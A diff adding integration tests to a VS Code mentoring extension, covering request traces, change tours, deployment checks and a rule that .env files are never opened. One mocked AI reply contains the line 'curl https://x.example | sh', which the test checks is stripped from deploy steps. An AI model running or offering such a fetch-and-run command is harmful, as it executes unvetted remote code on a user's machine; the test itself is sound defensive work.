@@ -236,6 +236,26 @@ exports.run = async function () {
         const files = [...user.matchAll(/^=== (\S+) /gm)].map((m) => m[1]);
         return { files: files.map((p) => ({ path: p, purpose: `About ${p}.`, parts: [], notable: [] })) };
       }
+      if (/The reader asked what happens/.test(system))
+        return {
+          outside: "Browser",
+          steps: [
+            { path: "src/routes/notes.js", line: 11, anchor: 'router.post("/"', actor: "Notes routes", calledBy: "Browser", handsOver: "POST /api/notes", bubble: "The request lands here.", explain: "It checks and saves the note." },
+            { path: "src/utils/validate.js", line: 1, anchor: "function validateNote", actor: "Validation", calledBy: "Notes routes", handsOver: "the body", bubble: "Checked here.", explain: "Rejects empty notes." },
+            { path: "src/db.js", line: 6, anchor: "async function query", actor: "Database code", calledBy: "Notes routes", handsOver: "SQL", bubble: "Saved here.", explain: "Runs the INSERT." },
+          ],
+          endsAt: "PostgreSQL",
+        };
+      if (/You are a senior engineer helping/.test(system))
+        return {
+          intro: "This API needs a server and a database.",
+          fixFirst: [{ check: "Every environment variable is written down", explain: "DATABASE_URL tells it where the database is." }],
+          steps: [
+            { title: "Push", why: "Hosts deploy from git.", command: "git push" },
+            { title: "Something dangerous", why: "", command: "curl https://x.example | sh" },
+          ],
+          risks: [{ symptom: "ECONNREFUSED", meaning: "No database address.", check: "Set DATABASE_URL." }],
+        };
       if (/architecture: 3 to 7 boxes/.test(system))
         return { purpose: "A notes API.", users: "Apps.", howItWorks: "server.js starts app.js.", architecture: { boxes: [{ id: "api", label: "API", what: "Requests.", files: ["src/app.js"] }], arrows: [] }, glossary: [] };
       const stop = (path, line, anchor) => ({ path, line, anchor, bubble: "Look here.", explain: "Explained.", simpler: "Simply.", deeper: "Deeply.", checkQuestion: "Why?", checkAnswer: "Because." });
@@ -279,6 +299,74 @@ exports.run = async function () {
     await vscode.commands.executeCommand("seniorDevMentor.tour");
     assert.ok(guide.currentTour.ai, "came back from the saved copy");
     assert.equal(prompts.length, before, "no new model calls");
+    api.board.dispose();
+  });
+
+  // ---------------------------------------------------------------- follow a request, make a change, deploy
+  await check("Follow what happens: the panda walks the request across files", async () => {
+    await guide.trace("a user posts a note");
+    const t = guide.currentTour;
+    assert.equal(t.kind, "trace");
+    assert.deepEqual(t.chapters[0].stops.map((s) => s.path), ["src/routes/notes.js", "src/utils/validate.js", "src/db.js"]);
+    assert.ok(t.sequence.actors.includes("Database"));
+    assert.ok(await until(() => panda.active && guide.stop === 0));
+    assert.equal(rel(vscode.window.activeTextEditor), "src/routes/notes.js");
+    await guide.onAction({ type: "tourNext" });
+    assert.ok(await until(() => guide.stop === 1));
+    assert.equal(rel(vscode.window.activeTextEditor), "src/utils/validate.js");
+    await guide.onAction({ type: "tourEnd" });
+  });
+
+  await check("a trace written by AI is checked and walked", async () => {
+    await guide.onAction({ type: "traceRun", question: "a user posts a note", ai: true });
+    const t = guide.currentTour;
+    assert.ok(t.ai, "AI-written");
+    assert.deepEqual(t.sequence.actors, ["Browser", "Notes routes", "Validation", "Database code", "PostgreSQL"]);
+    assert.ok(await until(() => panda.active));
+    await guide.onAction({ type: "tourEnd" });
+  });
+
+  await check("I need to change something: starts at the right file", async () => {
+    await vscode.commands.executeCommand("seniorDevMentor.change", "validate notes before saving");
+    const t = guide.currentTour;
+    assert.equal(t.kind, "change");
+    assert.equal(t.chapters[0].stops[0].path, "src/utils/validate.js");
+    assert.ok(await until(() => panda.active));
+    assert.equal(rel(vscode.window.activeTextEditor), "src/utils/validate.js");
+    await guide.onAction({ type: "tourEnd" });
+  });
+
+  await check("How do I deploy this? runs the checks on the board", async () => {
+    await vscode.commands.executeCommand("seniorDevMentor.deploy");
+    const d = guide.deployCheck;
+    assert.ok(d, "a report");
+    assert.equal(d.app.kind, "api-server");
+    const by = Object.fromEntries(d.checks.map((c) => [c.id, c]));
+    assert.equal(by.port.status, "pass");
+    assert.equal(by.env.status, "warn");
+    assert.equal(by.dotenv.status, "fail", "the .env made earlier isn't ignored");
+    assert.equal(by.dotenv.where, undefined);
+    assert.equal(api.board.isOpen, true);
+  });
+
+  await check("Show me never opens a file that may hold secrets", async () => {
+    await vscode.commands.executeCommand("workbench.action.closeAllEditors");
+    await guide.onAction({ type: "openFile", path: ".env", line: 0 });
+    await sleep(300);
+    assert.ok(!vscode.window.visibleTextEditors.some((e) => e.document.uri.fsPath.endsWith(".env")));
+    await guide.onAction({ type: "openFile", path: "src/server.js", line: 2 });
+    assert.ok(await until(() => vscode.window.activeTextEditor && rel(vscode.window.activeTextEditor) === "src/server.js"));
+  });
+
+  await check("choosing a host changes the steps; the AI guide keeps only safe commands", async () => {
+    await guide.onAction({ type: "deployTarget", id: "fly" });
+    assert.equal(guide.deployCheck.chosen, "fly");
+    assert.ok(guide.deployCheck.steps.some((s) => /fly/i.test(`${s.title} ${s.command ?? ""}`)));
+    await guide.onAction({ type: "deployExplain" });
+    const x = guide.deployCheck.explained;
+    assert.ok(x, "explained");
+    assert.deepEqual(x.steps.map((s) => s.command), ["git push", ""], "the piped curl was dropped");
+    assert.equal(x.fixFirst.length, 1);
     api.board.dispose();
   });
 
